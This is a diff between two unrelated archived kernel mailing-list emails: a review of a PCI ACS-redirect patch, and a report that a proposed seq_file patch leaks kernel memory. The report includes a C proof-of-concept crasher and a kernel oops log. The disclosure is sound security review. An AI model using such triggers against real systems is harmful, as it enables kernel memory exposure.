@@ -1,232 +1,373 @@
 Return-Path: <linux-doc-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on archive.lwn.net
 X-Spam-Level: 
-X-Spam-Status: No, score=-5.8 required=5.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
-	MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI autolearn=ham autolearn_force=no
-	version=3.4.1
+X-Spam-Status: No, score=-5.6 required=5.0 tests=DKIM_ADSP_CUSTOM_MED,
+	DKIM_SIGNED,HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI,
+	T_DKIM_INVALID autolearn=ham autolearn_force=no version=3.4.1
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by archive.lwn.net (Postfix) with ESMTP id ECC087D048
-	for <lwn-linux-doc@archive.lwn.net>; Fri,  6 Jul 2018 22:57:02 +0000 (UTC)
+	by archive.lwn.net (Postfix) with ESMTP id 71C277D071
+	for <lwn-linux-doc@archive.lwn.net>; Sat,  7 Jul 2018 00:56:42 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1754151AbeGFW5C convert rfc822-to-8bit (ORCPT
-        <rfc822;lwn-linux-doc@archive.lwn.net>);
-        Fri, 6 Jul 2018 18:57:02 -0400
-Received: from mx3-rdu2.redhat.com ([66.187.233.73]:50936 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1753905AbeGFW5B (ORCPT <rfc822;linux-doc@vger.kernel.org>);
-        Fri, 6 Jul 2018 18:57:01 -0400
-Received: from smtp.corp.redhat.com (int-mx05.intmail.prod.int.rdu2.redhat.com [10.11.54.5])
-        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
-        (No client certificate requested)
-        by mx1.redhat.com (Postfix) with ESMTPS id 5093ECB9E5;
-        Fri,  6 Jul 2018 22:57:00 +0000 (UTC)
-Received: from t450s.home (ovpn-116-113.phx2.redhat.com [10.3.116.113])
-        by smtp.corp.redhat.com (Postfix) with ESMTP id 9832B7C26;
-        Fri,  6 Jul 2018 22:56:55 +0000 (UTC)
-Date:   Fri, 6 Jul 2018 16:56:55 -0600
-From:   Alex Williamson <alex.williamson@redhat.com>
-To:     Logan Gunthorpe <logang@deltatee.com>
-Cc:     linux-kernel@vger.kernel.org, linux-pci@vger.kernel.org,
-        linux-doc@vger.kernel.org, Stephen Bates <sbates@raithlin.com>,
-        Christoph Hellwig <hch@lst.de>,
-        Bjorn Helgaas <bhelgaas@google.com>,
-        Jonathan Corbet <corbet@lwn.net>,
-        Ingo Molnar <mingo@kernel.org>,
-        Thomas Gleixner <tglx@linutronix.de>,
-        "Paul E. McKenney" <paulmck@linux.vnet.ibm.com>,
-        Marc Zyngier <marc.zyngier@arm.com>,
-        Kai-Heng Feng <kai.heng.feng@canonical.com>,
-        Frederic Weisbecker <frederic@kernel.org>,
-        Dan Williams <dan.j.williams@intel.com>,
-        =?UTF-8?B?SsOpcsO0bWU=?= Glisse <jglisse@redhat.com>,
-        Benjamin Herrenschmidt <benh@kernel.crashing.org>,
-        Christian =?UTF-8?B?S8O2bmln?= <christian.koenig@amd.com>,
-        Matthew Wilcox <willy@infradead.org>
-Subject: Re: [PATCH v5 3/3] PCI: Introduce the disable_acs_redir parameter
-Message-ID: <20180706165655.62306b6f@t450s.home>
-In-Reply-To: <20180627174650.27433-4-logang@deltatee.com>
-References: <20180627174650.27433-1-logang@deltatee.com>
-        <20180627174650.27433-4-logang@deltatee.com>
+        id S1754100AbeGGA4l (ORCPT <rfc822;lwn-linux-doc@archive.lwn.net>);
+        Fri, 6 Jul 2018 20:56:41 -0400
+Received: from mail-oi0-f68.google.com ([209.85.218.68]:33514 "EHLO
+        mail-oi0-f68.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1754098AbeGGA4k (ORCPT
+        <rfc822;linux-doc@vger.kernel.org>); Fri, 6 Jul 2018 20:56:40 -0400
+Received: by mail-oi0-f68.google.com with SMTP id c6-v6so26636182oiy.0
+        for <linux-doc@vger.kernel.org>; Fri, 06 Jul 2018 17:56:39 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
+         :cc;
+        bh=t+CdCzWyAXcKVqSMfIMRWN8UX+r5otInpD66Nos087I=;
+        b=NQhSyNUjIsN8FvGGNHkOgEHpFofFYuSD+y8i6t2c840nYgQCuiX/TbVYZ/Sv/bdXxo
+         0NXei/xSyJJN2MLe3OXLexgn684uoydqvCZjqyVh9bJgrntrIiMZvENUrb0631VnVKNG
+         NZ0BdddSULw0gxmlME7tXnZp2pFlvzLAT+f+JWbTAd2xOof29Ec9SdZdNxwVdPBU2F0C
+         A2kEqLXIanzN9SZSfmgeTQQq8rO7nFt56FJAg+80hQsyQGqNxFncWXgUM7y3dP6xqrSj
+         yb0TIi21u/30yHUmR84LVra3Eu0uNRcQslfw+KL7XRZDCChAcCwHov50BMZkwuuC972a
+         nt8A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to:cc;
+        bh=t+CdCzWyAXcKVqSMfIMRWN8UX+r5otInpD66Nos087I=;
+        b=U1sb1t0hyvQNstEiZPvtLOV6nrsRYXKi69VmRPMtdyC9JgFsrptaF545wCrOYagfN6
+         OzUzQv4JIzc0VYdIwzeq6PuNTBX0HWlI0XMMPmPDnV1qFs/3o77cfiCghmNyCZtDvi9K
+         fVV8K8PAVob9mJUeSmSdogB7NFvsdfqcPXKcmp97mXQOV5MJzytkmq0dfR4Nu8edUS2H
+         V92d89TlY7f2oKCVv+QGJDrz6ccGjA2Y1FNqmYNlOWBUcs9523BUzcSVcBlYkLBTGqQl
+         jvElryUVN6wgKpDvkGCVm/vIRHAdFuUFFlDMLvYzfQDmH1nizeAF1wqm4iSHH193bOuU
+         K40w==
+X-Gm-Message-State: APt69E29mFI7HLtZJ7glL/FTdxa1Ed5/AYWdw0cswYlnYPkMNg/XUznq
+        +DJ0AIOzEoNtfXVoX+T46gABYkOtGKona9+iTt+04g==
+X-Google-Smtp-Source: AAOMgpeFSpUCVwWApZOZBcWz0njhswSN6WQjrIrLqQhr8tMQD93QdTcl1pq3+DL5R9d5kVx8wOhQ8t/ZC1sOeH9HHoI=
+X-Received: by 2002:aca:c42:: with SMTP id i2-v6mr12460528oiy.219.1530924998856;
+ Fri, 06 Jul 2018 17:56:38 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8BIT
-X-Scanned-By: MIMEDefang 2.79 on 10.11.54.5
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.11.55.1]); Fri, 06 Jul 2018 22:57:00 +0000 (UTC)
-X-Greylist: inspected by milter-greylist-4.5.16 (mx1.redhat.com [10.11.55.1]); Fri, 06 Jul 2018 22:57:00 +0000 (UTC) for IP:'10.11.54.5' DOMAIN:'int-mx05.intmail.prod.int.rdu2.redhat.com' HELO:'smtp.corp.redhat.com' FROM:'alex.williamson@redhat.com' RCPT:''
+References: <87vacsrt0r.fsf@notabene.neil.brown.name> <87fu3dihtf.fsf@notabene.neil.brown.name>
+ <874lintqa6.fsf@notabene.neil.brown.name> <87y3fcegnn.fsf@notabene.neil.brown.name>
+In-Reply-To: <87y3fcegnn.fsf@notabene.neil.brown.name>
+From:   Jann Horn <jannh@google.com>
+Date:   Sat, 7 Jul 2018 02:56:12 +0200
+Message-ID: <CAG48ez2yTZMye0W3_5R04bV-Qyaz-=zSiVonw_zvRQNH6dcfeg@mail.gmail.com>
+Subject: Re: [PATCH resend*3] VFS: simplify seq_file iteration code and interface
+To:     neilb@suse.com, Andrew Morton <akpm@linux-foundation.org>,
+        Al Viro <viro@zeniv.linux.org.uk>,
+        Kees Cook <keescook@chromium.org>
+Cc:     Linus Torvalds <torvalds@linux-foundation.org>,
+        linux-doc@vger.kernel.org,
+        kernel list <linux-kernel@vger.kernel.org>,
+        linux-fsdevel@vger.kernel.org, Jonathan Corbet <corbet@lwn.net>
+Content-Type: text/plain; charset="UTF-8"
 Sender: linux-doc-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-doc.vger.kernel.org>
 X-Mailing-List: linux-doc@vger.kernel.org
 
-On Wed, 27 Jun 2018 11:46:50 -0600
-Logan Gunthorpe <logang@deltatee.com> wrote:
-
-> In order to support P2P traffic on a segment of the PCI hierarchy,
-> we must be able to disable the ACS redirect bits for select
-> PCI bridges. The bridges must be selected before the devices are
-> discovered by the kernel and the IOMMU groups created. Therefore,
-> a kernel command line parameter is created to specify devices
-> which must have their ACS bits disabled.
-> 
-> The new parameter takes a list of devices separated by a semicolon.
-> Each device specified will have it's ACS redirect bits disabled.
-> This is similar to the existing 'resource_alignment' parameter.
-> 
-> The ACS Request P2P Request Redirect, P2P Completion Redirect and P2P
-> Egress Control bits are disabled which is sufficient to always allow
-> passing P2P traffic uninterrupted. The bits are set after the kernel
-> (optionally) enables the ACS bits itself. It is also done regardless of
-> whether the kernel sets the bits or not seeing some BIOS firmware is known
-> to set the bits on boot.
-> 
-> Signed-off-by: Logan Gunthorpe <logang@deltatee.com>
-> Reviewed-by: Stephen Bates <sbates@raithlin.com>
-> Acked-by: Christian König <christian.koenig@amd.com>
+On Sat, Jul 7, 2018 at 2:11 AM NeilBrown <neilb@suse.com> wrote:
+>
+>
+> The documentation for seq_file suggests that it is necessary to be
+> able to move the iterator to a given offset, however that is not the
+> case.  If the iterator is stored in the private data and is stable
+> from one read() syscall to the next, it is only necessary to support
+> first/next interactions.  Implementing this in a client is a little
+> clumsy.
+> - if ->start() is given a pos of zero, it should go to start of
+>   sequence.
+> - if ->start() is given the name pos that was given to the most recent
+>   next() or start(), it should restore the iterator to state just
+>   before that last call
+> - if ->start is given another number, it should set the iterator one
+>   beyond the start just before the last ->start or ->next call.
+>
+>
+> Also, the documentation says that the implementation can interpret the
+> pos however it likes (other than zero meaning start), but seq_file
+> increments the pos sometimes which does impose on the implementation.
+>
+> This patch simplifies the interface for first/next iteration and
+> simplifies the code, while maintaining complete backward
+> compatability.  Now:
+>
+> - if ->start() is given a pos of zero, it should return an iterator
+>   placed at the start of the sequence
+> - if ->start() is given a non-zero pos, it should return the iterator
+>   in the same state it was after the last ->start or ->next.
+>
+> This is particularly useful for interators which walk the multiple
+> chains in a hash table, e.g. using rhashtable_walk*. See
+> fs/gfs2/glock.c and drivers/staging/lustre/lustre/llite/vvp_dev.c
+>
+> A large part of achieving this is to *always* call ->next after ->show
+> has successfully stored all of an entry in the buffer.  Never just
+> increment the index instead.
+> Also:
+>  - always pass &m->index to ->start() and ->next(), never a temp
+>    variable
+>  - don't clear ->from when ->count is zero, as ->from is dead when
+>     ->count is zero.
+>
+>
+> Some ->next functions do not increment *pos when they return NULL.
+> To maintain compatability with this, we still need to increment
+> m->index in one place, if ->next didn't increment it.
+> Note that such ->next functions are buggy and should be fixed.
+> A simple demonstration is
+>    dd if=/proc/swaps bs=1000 skip=1
+> Choose any block size larger than the size of /proc/swaps.
+> This will always show the whole last line of /proc/swaps.
+>
+> This patch doesn't work around buggy next() functions for this case.
+>
+> Acked-by: Jonathan Corbet <corbet@lwn.net> (For the docs part)
+> Signed-off-by: NeilBrown <neilb@suse.com>
 > ---
->  Documentation/admin-guide/kernel-parameters.txt |  9 ++++
->  drivers/pci/pci.c                               | 71 ++++++++++++++++++++++++-
->  2 files changed, 78 insertions(+), 2 deletions(-)
-> 
-> diff --git a/Documentation/admin-guide/kernel-parameters.txt b/Documentation/admin-guide/kernel-parameters.txt
-> index a69947d9e14e..02634c4ab181 100644
-> --- a/Documentation/admin-guide/kernel-parameters.txt
-> +++ b/Documentation/admin-guide/kernel-parameters.txt
-> @@ -3192,6 +3192,15 @@
->  				Adding the window is slightly risky (it may
->  				conflict with unreported devices), so this
->  				taints the kernel.
-> +		disable_acs_redir=<pci_dev>[; ...]
-> +				Specify one or more PCI devices (in the format
-> +				specified above) separated by semicolons.
-> +				Each device specified will have the PCI ACS
-> +				redirect capabilities forced off which will
-> +				allow P2P traffic between devices through
-> +				bridges without forcing it upstream. Note:
-> +				this removes isolation between devices and
-> +				will make the IOMMU groups less granular.
->  
->  	pcie_aspm=	[PCIE] Forcibly enable or disable PCIe Active State Power
->  			Management.
-> diff --git a/drivers/pci/pci.c b/drivers/pci/pci.c
-> index 59638075b4df..079f7c911e09 100644
-> --- a/drivers/pci/pci.c
-> +++ b/drivers/pci/pci.c
-> @@ -2983,6 +2983,61 @@ void pci_request_acs(void)
->  	pci_acs_enable = 1;
->  }
->  
-> +static const char *disable_acs_redir_param;
-> +
-> +/**
-> + * pci_disable_acs_redir - disable ACS redirect capabilities
-> + * @dev: the PCI device
-> + *
-> + * For only devices specified in the disable_acs_redir parameter.
-> + */
-> +static void pci_disable_acs_redir(struct pci_dev *dev)
-> +{
-> +	int ret = 0;
-> +	const char *p;
-> +	int pos;
-> +	u16 ctrl;
-> +
-> +	if (!disable_acs_redir_param)
-> +		return;
-> +
-> +	p = disable_acs_redir_param;
-> +	while (*p) {
-> +		ret = pci_dev_str_match(dev, p, &p);
-> +		if (ret < 0) {
-> +			pr_info_once("PCI: Can't parse disable_acs_redir parameter: %s\n",
-> +				     disable_acs_redir_param);
-> +
-> +			break;
-> +		} else if (ret == 1) {
-> +			/* Found a match */
-> +			break;
-> +		}
-> +
-> +		if (*p != ';' && *p != ',') {
-> +			/* End of param or invalid format */
-> +			break;
-> +		}
-> +		p++;
-> +	}
-> +
-> +	if (ret != 1)
-> +		return;
-> +
-> +	pos = pci_find_ext_capability(dev, PCI_EXT_CAP_ID_ACS);
-> +	if (!pos)
-> +		return;
-> +
-> +	pci_read_config_word(dev, pos + PCI_ACS_CTRL, &ctrl);
-> +
-> +	/* P2P Request & Completion Redirect */
-> +	ctrl &= ~(PCI_ACS_RR | PCI_ACS_CR | PCI_ACS_EC);
-> +
-> +	pci_write_config_word(dev, pos + PCI_ACS_CTRL, ctrl);
-> +
-> +	pci_info(dev, "disabled ACS redirect\n");
-> +}
-> +
->  /**
->   * pci_std_enable_acs - enable ACS on devices using standard ACS capabilites
->   * @dev: the PCI device
-> @@ -3022,12 +3077,22 @@ static void pci_std_enable_acs(struct pci_dev *dev)
->  void pci_enable_acs(struct pci_dev *dev)
+>
+> Still hoping someone might apply this, or at least review it,
+> or maybe just tell me how insane it is - anything but silence :-(
+>
+> NeilBrown
+[...]
+> diff --git a/fs/seq_file.c b/fs/seq_file.c
+> index 4cc090b50cc5..fd82585ab50f 100644
+> --- a/fs/seq_file.c
+> +++ b/fs/seq_file.c
+[...]
+> @@ -160,7 +154,6 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
 >  {
->  	if (!pci_acs_enable)
-> -		return;
-> +		goto disable_acs_redir;
->  
->  	if (!pci_dev_specific_enable_acs(dev))
-> -		return;
-> +		goto disable_acs_redir;
->  
->  	pci_std_enable_acs(dev);
+>         struct seq_file *m = file->private_data;
+>         size_t copied = 0;
+> -       loff_t pos;
+>         size_t n;
+>         void *p;
+>         int err = 0;
+> @@ -223,16 +216,11 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
+>                 size -= n;
+>                 buf += n;
+>                 copied += n;
+> -               if (!m->count) {
+> -                       m->from = 0;
+> -                       m->index++;
+> -               }
+>                 if (!size)
+>                         goto Done;
+>         }
+>         /* we need at least one record in buffer */
+> -       pos = m->index;
+> -       p = m->op->start(m, &pos);
+> +       p = m->op->start(m, &m->index);
+>         while (1) {
+>                 err = PTR_ERR(p);
+>                 if (!p || IS_ERR(p))
+> @@ -243,8 +231,7 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
+>                 if (unlikely(err))
+>                         m->count = 0;
+>                 if (unlikely(!m->count)) {
+> -                       p = m->op->next(m, p, &pos);
+> -                       m->index = pos;
+> +                       p = m->op->next(m, p, &m->index);
+>                         continue;
+>                 }
+>                 if (m->count < m->size)
+> @@ -256,29 +243,33 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
+>                 if (!m->buf)
+>                         goto Enomem;
+>                 m->version = 0;
+> -               pos = m->index;
+> -               p = m->op->start(m, &pos);
+> +               p = m->op->start(m, &m->index);
+>         }
+>         m->op->stop(m, p);
+>         m->count = 0;
+>         goto Done;
+>  Fill:
+>         /* they want more? let's try to get some more */
+> -       while (m->count < size) {
+> +       while (1) {
+>                 size_t offs = m->count;
+> -               loff_t next = pos;
+> -               p = m->op->next(m, p, &next);
+> +               loff_t pos = m->index;
 > +
-> +disable_acs_redir:
-> +	/*
-> +	 * Note: pci_disable_acs_redir() must be called even if
-> +	 * ACS is not enabled by the kernel because the firmware
-> +	 * may have unexpectedly set the flags. So if we are told
-> +	 * to disable it, we should always disable it after setting
-> +	 * the kernel's default preferences.
-> +	 */
-> +	pci_disable_acs_redir(dev);
->  }
->  
->  static bool pci_acs_flags_enabled(struct pci_dev *pdev, u16 acs_flags)
-> @@ -5967,6 +6032,8 @@ static int __init pci_setup(char *str)
->  				pcie_bus_config = PCIE_BUS_PEER2PEER;
->  			} else if (!strncmp(str, "pcie_scan_all", 13)) {
->  				pci_add_flags(PCI_SCAN_ALL_PCIE_DEVS);
-> +			} else if (!strncmp(str, "disable_acs_redir=", 18)) {
-> +				disable_acs_redir_param = str + 18;
->  			} else {
->  				printk(KERN_ERR "PCI: Unknown option `%s'\n",
->  						str);
+> +               p = m->op->next(m, p, &m->index);
+> +               if (pos == m->index)
+> +                       /* Buggy ->next function */
+> +                       m->index++;
+>                 if (!p || IS_ERR(p)) {
+>                         err = PTR_ERR(p);
+>                         break;
+>                 }
+> +               if (m->count >= size)
+> +                       break;
+>                 err = m->op->show(m, p);
+>                 if (seq_has_overflowed(m) || err) {
+>                         m->count = offs;
+>                         if (likely(err <= 0))
+>                                 break;
+>                 }
+> -               pos = next;
+>         }
+>         m->op->stop(m, p);
+>         n = min(m->count, size);
+> @@ -287,11 +278,7 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
+>                 goto Efault;
+>         copied += n;
+>         m->count -= n;
+> -       if (m->count)
+> -               m->from = n;
+> -       else
+> -               pos++;
+> -       m->index = pos;
+> +       m->from = n;
 
-If we lived in a perfect world where vendors actually implemented ACS
-correctly, this looks fine, I approve.  But take a look at the quirks
-we call out to via pci_dev_specific_enable_acs().  Both of these are
-for Intel root ports, in one case we're twiddling ACS comparable
-features in the device, in the other Intel has decided specs don't
-matter and used dwords rather than words for the ACS capability and
-control registers.  Is disabling redirect via device specific means,
-then attempting to re-enable via standard mechanisms perhaps not the
-right approach here?  Maybe if we determine a device is slated to
-enable p2p we shouldn't call the device specific enabler.  The
-non-standard ACS implementation on Intel root ports is still
-troublesome though, I wonder if we need a more generic approach for
-those...
+This patch introduces a kernel memory disclosure bug when something
+like the following sequence of events happens (starting from a freshly
+opened seq file):
 
-Maybe we track if we enabled ACS via a device specific quirk and
-minimally print an incompatibility error if it's also specified for
-disable_acs_redir?  Thanks,
+1. read(seq_fd, buf, 2000): sets m->from=2000, m->count=100
+2. create a buffer broken_buf which consists of 1000 bytes writable
+memory followed by unmapped memory
+3. read(seq_fd, broken_buf, 3100):
+        - flushes buffered data to userspace, result: m->from=2100, m->count=0
+        - accumulates new data, result: m->from=2100, m->count=3050
+        - tries to copy new data to userspace, but fails ("goto Efault")
+4. read(seq_fd, buf, 4096): does copy_to_user(buf, m->buf + m->from, n)
 
-Alex
+I wrote the following crasher to test this:
+
+==================
+#include <sys/mman.h>
+#include <err.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(void) {
+  // dummy mappings: make sure /proc/self/smaps has lots to say
+  for (int i=0; i<50; i++) {
+    void *mapping = mmap(NULL, 0x2000, PROT_READ,
+MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (mapping == MAP_FAILED)
+      err(1, "mmap");
+    if (mprotect(mapping, 0x1000, PROT_NONE))
+      err(1, "mprotect");
+  }
+
+  int fd = open("/proc/self/smaps", O_RDONLY);
+  if (fd == -1)
+    err(1, "open");
+  char buf[0x1000];
+
+  // set m->from = 2000, m->count ~= 100
+  int first_res = read(fd, buf, 2000);
+  if (first_res != 2000)
+    errx(1, "first res");
+
+  // broken_buf: 1000 bytes writable memory followed by unmapped memory
+  char *broken_buf_base = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
+MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  if (broken_buf_base == MAP_FAILED)
+    err(1, "mmap");
+  if (mprotect(broken_buf_base+0x1000, 0x1000, PROT_NONE))
+    err(1, "mprotect");
+  char *broken_buf = broken_buf_base+0x1000-1000;
+
+  // set m->from = 2000, m->count ~= 3050
+  int second_res = read(fd, broken_buf, 3100);
+  printf("second read: %d\n", second_res);
+  if (second_res <= 0 || second_res > 1000)
+    errx(1, "second read didn't partly succeed as expected");
+
+  // trigger OOB read
+  read(fd, buf, 0x1000);
+}
+==================
+
+Running this against a linux-next build with
+CONFIG_HARDENED_USERCOPY=y, I reliably get kernel oopses that look as
+follows:
+
+==================
+[  240.215442] usercopy: Kernel memory exposure attempt detected from
+SLAB object 'kmalloc-4096' (offset 2663, size 2613)!
+[  240.215475] ------------[ cut here ]------------
+[  240.215478] kernel BUG at mm/usercopy.c:100!
+[  240.215491] invalid opcode: 0000 [#1] SMP KASAN PTI
+[  240.215500] CPU: 1 PID: 968 Comm: seq_read_trigge Not tainted
+4.18.0-rc3-next-20180706 #37
+[  240.215506] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+BIOS 1.10.2-1 04/01/2014
+[  240.215540] RIP: 0010:usercopy_abort+0x69/0x80
+[  240.215544] Code: 44 d0 53 48 c7 c0 60 98 ae 92 51 48 c7 c6 e0 97
+ae 92 41 53 48 89 f9 48 0f 45 f0 4c 89 d2 48 c7 c7 80 99 ae 92 e8 e0
+2d dc ff <0f> 0b 49 c7 c1 20 97 ae 92 4d 89 cb 4d 89 c8 eb a5 66 0f 1f
+44 00
+[  240.215615] RSP: 0018:ffff8801d0a47bf8 EFLAGS: 00010286
+[  240.215621] RAX: 000000000000006b RBX: 0000000000000a35 RCX: ffffffff911c883e
+[  240.215627] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff8801ec3261cc
+[  240.215632] RBP: ffffea00079e2800 R08: ffffed003d864f29 R09: ffffed003d864f29
+[  240.215637] R10: ffffffff92ae9820 R11: ffffed003d864f28 R12: 0000000000000a35
+[  240.215643] R13: 0000000000000001 R14: ffff8801e78a1ddc R15: ffffea00079e2800
+[  240.215649] FS:  00007f820d397700(0000) GS:ffff8801ec300000(0000)
+knlGS:0000000000000000
+[  240.215655] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  240.215660] CR2: 00007f820cf4f4c4 CR3: 00000001e7868003 CR4: 00000000001606e0
+[  240.215668] Call Trace:
+[  240.215680]  __check_heap_object+0xb3/0xc0
+[  240.215691]  __check_object_size+0xdc/0x240
+[  240.215702]  ? check_stack_object+0x21/0x60
+[  240.215722]  seq_read+0x3d8/0x6a0
+[  240.215740]  ? ldsem_up_read+0x13/0x40
+[  240.215750]  __vfs_read+0xc4/0x370
+[  240.215758]  ? __x64_sys_copy_file_range+0x2d0/0x2d0
+[  240.215768]  ? vma_compute_subtree_gap+0x95/0xc0
+[  240.215775]  ? vma_gap_callbacks_rotate+0x37/0x50
+[  240.215785]  ? fsnotify+0x895/0x8e0
+[  240.215794]  ? fsnotify+0x895/0x8e0
+[  240.215806]  ? __fsnotify_inode_delete+0x20/0x20
+[  240.215816]  vfs_read+0xa5/0x190
+[  240.215823]  ksys_read+0xa1/0x120
+[  240.215830]  ? kernel_write+0xa0/0xa0
+[  240.215847]  ? mm_fault_error+0x1b0/0x1b0
+[  240.215858]  do_syscall_64+0x73/0x160
+[  240.215874]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[  240.215881] RIP: 0033:0x7f820cecf700
+[  240.215885] Code: b6 fe ff ff 48 8d 3d 87 be 08 00 48 83 ec 08 e8
+06 db 01 00 66 0f 1f 44 00 00 83 3d 49 30 2c 00 00 75 10 b8 00 00 00
+00 0f 05 <48> 3d 01 f0 ff ff 73 31 c3 48 83 ec 08 e8 de 9b 01 00 48 89
+04 24
+[  240.215955] RSP: 002b:00007ffffbcb56a8 EFLAGS: 00000246 ORIG_RAX:
+0000000000000000
+[  240.215962] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f820cecf700
+[  240.215967] RDX: 0000000000001000 RSI: 00007ffffbcb56b0 RDI: 0000000000000003
+[  240.215972] RBP: 00007ffffbcb66e0 R08: 0000000000000001 R09: 0000000000000011
+[  240.215977] R10: 0000000000000064 R11: 0000000000000246 R12: 0000558430e72730
+[  240.215982] R13: 00007ffffbcb67c0 R14: 0000000000000000 R15: 0000000000000000
+[  240.215988] Modules linked in:
+[  240.215996] ---[ end trace a76025513bde017a ]---
+[  240.216004] RIP: 0010:usercopy_abort+0x69/0x80
+[  240.216007] Code: 44 d0 53 48 c7 c0 60 98 ae 92 51 48 c7 c6 e0 97
+ae 92 41 53 48 89 f9 48 0f 45 f0 4c 89 d2 48 c7 c7 80 99 ae 92 e8 e0
+2d dc ff <0f> 0b 49 c7 c1 20 97 ae 92 4d 89 cb 4d 89 c8 eb a5 66 0f 1f
+44 00
+[  240.216076] RSP: 0018:ffff8801d0a47bf8 EFLAGS: 00010286
+[  240.216082] RAX: 000000000000006b RBX: 0000000000000a35 RCX: ffffffff911c883e
+[  240.216087] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff8801ec3261cc
+[  240.216092] RBP: ffffea00079e2800 R08: ffffed003d864f29 R09: ffffed003d864f29
+[  240.216098] R10: ffffffff92ae9820 R11: ffffed003d864f28 R12: 0000000000000a35
+[  240.216103] R13: 0000000000000001 R14: ffff8801e78a1ddc R15: ffffea00079e2800
+[  240.216109] FS:  00007f820d397700(0000) GS:ffff8801ec300000(0000)
+knlGS:0000000000000000
+[  240.216114] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  240.216119] CR2: 00007f820cf4f4c4 CR3: 00000001e7868003 CR4: 00000000001606e0
+==================
+
+(I first started staring at this code because Kees pointed me to
+https://syzkaller.appspot.com/bug?extid=4b712dce5cbce6700f27 , but I
+think the case I found doesn't quite match what syzcaller is saying?)
 --
 To unsubscribe from this list: send the line "unsubscribe linux-doc" in
 the body of a message to majordomo@vger.kernel.org
